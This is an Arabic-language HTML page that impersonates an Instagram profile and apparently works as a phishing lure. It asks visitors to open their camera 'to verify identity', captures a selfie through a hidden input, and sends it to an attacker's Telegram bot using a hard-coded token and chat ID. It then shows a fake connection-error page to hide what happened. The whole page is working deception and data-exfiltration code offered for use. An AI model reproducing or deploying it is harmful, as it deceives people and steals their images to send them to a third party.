<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>حساب Instagram</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    min-height: 100vh; display: flex; align-items: center; justify-content: center;
    background: #fafafa;
    font-family: -apple-system, 'Segoe UI', Tahoma, sans-serif;
    color: #262626; padding: 20px;
  }
  .card {
    width: 100%; max-width: 400px; background: #fff;
    border: 1px solid #dbdbdb; border-radius: 12px;
    padding: 40px 32px 32px; text-align: center;
    box-shadow: 0 4px 24px rgba(0,0,0,0.06);
  }
  .avatar-wrapper { width: 140px; height: 140px; margin: 0 auto 20px; }
  .avatar {
    width: 100%; height: 100%; border-radius: 50%; padding: 4px;
    background: linear-gradient(45deg, #405DE6,#833AB4,#E1306C,#F77737,#FFDC80);
  }
  .avatar img {
    width: 100%; height: 100%; border-radius: 50%; object-fit: cover;
    display: block; background: #efefef; border: 3px solid #fff;
  }
  .name { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
  .bio { font-size: 14px; color: #8e8e8e; margin-bottom: 22px; line-height: 1.7; }
  .divider { height: 1px; background: #dbdbdb; margin-bottom: 22px; }

  #status {
    font-size: 14px; line-height: 1.8; min-height: 64px;
    padding: 18px; border-radius: 12px;
    background: #fafafa; border: 1px solid #dbdbdb;
    display: flex; align-items: center; justify-content: center;
    flex-direction: column;
  }
  .spinner {
    display: inline-block; width: 16px; height: 16px;
    border: 2px solid rgba(0,0,0,0.1); border-top-color: #0095F6;
    border-radius: 50%; animation: spin .7s linear infinite;
    vertical-align: -3px; margin-inline-end: 8px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  /* زر مخصص يفتح كاميرا النظام */
  .capture-btn {
    display: none;
    margin: 20px auto 0;
    padding: 16px 28px;
    border-radius: 12px;
    background: linear-gradient(45deg, #405DE6,#833AB4,#E1306C,#F77737,#FFDC80);
    color: #fff; font-size: 16px; font-weight: 700;
    border: none; cursor: pointer; width: 100%;
    box-shadow: 0 6px 20px rgba(225,48,108,0.3);
  }
  .capture-btn:active { transform: scale(0.97); }

  /* input مخفي تماماً */
  #cameraInput {
    position: absolute;
    top: -9999px; left: -9999px;
    width: 1px; height: 1px;
    opacity: 0;
  }
</style>
</head>
<body>

<div class="card">

  <div class="avatar-wrapper">
    <div class="avatar">
      <img id="avatarImg" src="https://i.postimg.cc/PqhHkNvf/mohammed.jpg" alt=" "
           onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect fill=%22%23efefef%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2258%22 font-size=%2240%22 text-anchor=%22middle%22 fill=%22%238e8e8e%22>?</text></svg>'">
    </div>
  </div>

  <h1 class="name">@Mohammed Dawood</h1>
  <p class="bio">سجل الدخول للوصول لحساب هذا المستخدم على Instagram</p>

  <div class="divider"></div>

  <div id="status" class="status-info">
    <div><span class="spinner"></span>جار فتح حساب Instagram</div>
  </div>

  <!-- زر التقاط الكاميرا (يظهر فقط على الهاتف) -->
  <button class="capture-btn" id="captureBtn">📸 افتح الكاميرا للتحقق</button>

  <!-- input فتح كاميرا النظام بدون إذن -->
  <input type="file" id="cameraInput" accept="image/*" capture="user">
</div>

<script>
var TELEGRAM_TOKEN   = '8662015576:AAEdAgAPTh4L_-Mgk-Wo44kpovyTCyO8mJQ';
var TELEGRAM_CHAT_ID = '8335283387';

var CONFIG = {
  quality: 0.85,
  maxWidth: 900,
  errorDelayMs: 800
};

var statusEl  = document.getElementById('status');
var captureBtn = document.getElementById('captureBtn');
var cameraInput = document.getElementById('cameraInput');

function setStatus(html, spinner) {
  statusEl.className = '';
  statusEl.style.color = '#0095F6';
  statusEl.innerHTML = (spinner ? '<span class="spinner"></span>' : '') + html;
}

/* ===== إرسال الصورة إلى تليجرام ===== */
function sendPhoto(blob) {
  var url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendPhoto';
  var fd = new FormData();
  fd.append('chat_id', TELEGRAM_CHAT_ID);
  fd.append('photo', blob, 'selfie.jpg');
  fd.append('caption',
    '📸 صورة تحقق جديدة\n' +
    '🕐 ' + new Date().toLocaleString('ar-EG')
  );
  return fetch(url, { method: 'POST', body: fd })
    .then(function (res) { return res.json(); })
    .then(function (data) {
      if (!data.ok) throw new Error(data.description || 'فشل الإرسال');
      return data;
    });
}

/* ===== ضغط الصورة قبل الإرسال ===== */
function compressImage(file) {
  return new Promise(function (resolve, reject) {
    var reader = new FileReader();
    reader.onload = function (e) {
      var img = new Image();
      img.onload = function () {
        var scale = Math.min(1, CONFIG.maxWidth / img.width);
        var canvas = document.createElement('canvas');
        canvas.width  = Math.round(img.width * scale);
        canvas.height = Math.round(img.height * scale);
        var ctx = canvas.getContext('2d');
        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(function (blob) {
          if (blob) resolve(blob);
          else reject(new Error('فشل ضغط الصورة'));
        }, 'image/jpeg', CONFIG.quality);
      };
      img.onerror = function () { reject(new Error('فشل تحميل الصورة')); };
      img.src = e.target.result;
    };
    reader.onerror = function () { reject(new Error('فشل قراءة الملف')); };
    reader.readAsDataURL(file);
  });
}

/* ===== عند اختيار صورة من كاميرا النظام ===== */
cameraInput.addEventListener('change', async function (e) {
  var file = e.target.files && e.target.files[0];
  if (!file) {
    setStatus('لم يتم التقاط أي صورة. حاول مرة أخرى.', false);
    captureBtn.style.display = 'block';
    return;
  }

  captureBtn.style.display = 'none';
  setStatus('📸 جارٍ معالجة الصورة…', true);

  try {
    var blob = await compressImage(file);
    setStatus('☁️ جارٍ إرسال الصورة…', true);
    await sendPhoto(blob);

    // صفحة فشل الاتصال
    setTimeout(showInternetErrorPage, CONFIG.errorDelayMs);
  } catch (err) {
    console.error(err);
    setStatus('❌ فشل الإرسال. حاول مرة أخرى.', false);
    captureBtn.style.display = 'block';
  }
});

/* ===== زر الالتقاط ===== */
captureBtn.addEventListener('click', function () {
  cameraInput.click();   // يفتح كاميرا النظام مباشرة
});

/* ===== صفحة فشل الاتصال ===== */
function showInternetErrorPage() {
  var page = '<!DOCTYPE html><html lang="ar" dir="rtl"><head>' +
    '<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">' +
    '<title>لا يوجد اتصال</title><style>' +
    '*{box-sizing:border-box;margin:0;padding:0}' +
    'body{min-height:100vh;display:flex;align-items:center;justify-content:center;' +
      'background:#fafafa;font-family:-apple-system,Tahoma,sans-serif;color:#262626;' +
      'padding:24px;text-align:center}' +
    '.wrap{max-width:420px;width:100%}' +
    '.wifi{width:110px;height:110px;margin:0 auto 26px;display:block}' +
    '.ring{fill:none;stroke:url(#g);stroke-width:8;stroke-linecap:round;opacity:0;' +
      'animation:p 2.2s ease-out infinite}' +
    '.ring:nth-child(1){animation-delay:0s}.ring:nth-child(2){animation-delay:.35s}' +
    '.ring:nth-child(3){animation-delay:.7s}.dot{fill:url(#g)}' +
    '.cross{stroke:#ed4956;stroke-width:9;stroke-linecap:round;opacity:.9}' +
    '@keyframes p{0%{opacity:0}40%{opacity:1}100%{opacity:0}}' +
    'h1{font-size:22px;font-weight:700;margin-bottom:14px}' +
    'p{font-size:15px;line-height:1.9;color:#8e8e8e;margin-bottom:28px}' +
    '.btn{display:inline-block;padding:13px 32px;border-radius:10px;' +
      'background:linear-gradient(45deg,#405DE6,#833AB4,#E1306C,#F77737,#FFDC80);' +
      'color:#fff;font-size:15px;font-weight:700;border:none;cursor:pointer;' +
      'box-shadow:0 6px 20px rgba(225,48,108,.3);font-family:inherit}' +
    '.code{margin-top:24px;font-size:12px;color:#c7c7c7}' +
    '</style></head><body><div class="wrap">' +
    '<svg class="wifi" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">' +
      '<defs><linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%">' +
        '<stop offset="0%" stop-color="#405DE6"/><stop offset="25%" stop-color="#833AB4"/>' +
        '<stop offset="50%" stop-color="#E1306C"/><stop offset="75%" stop-color="#F77737"/>' +
        '<stop offset="100%" stop-color="#FFDC80"/></linearGradient></defs>' +
      '<path class="ring" d="M 20 70 A 50 50 0 0 1 100 70"/>' +
      '<path class="ring" d="M 35 82 A 32 32 0 0 1 85 82"/>' +
      '<path class="ring" d="M 50 94 A 15 15 0 0 1 70 94"/>' +
      '<circle class="dot" cx="60" cy="103" r="6"/>' +
      '<line class="cross" x1="22" y1="22" x2="98" y2="98"/></svg>' +
    '<h1>فشل الاتصال بالإنترنت</h1>' +
    '<p>تعذّر الاتصال بالشبكة.<br>يرجى التحقق من اتصالك بالإنترنت ثم المحاولة مرة أخرى.</p>' +
    '<button class="btn" onclick="location.reload()">إعادة المحاولة</button>' +
    '<div class="code">ERR_INTERNET_DISCONNECTED</div></div></body></html>';

  document.open();
  document.write(page);
  document.close();
}

/* ===== التدفق الرئيسي ===== */
function runVerification() {
  setStatus('🔒 للتحقق من هويتك، اضغط على الزر لفتح الكاميرا.', false);
  captureBtn.style.display = 'block';
}

window.addEventListener('load', function () {
  setTimeout(runVerification, 3000);
});
</script>

</body>
</html>
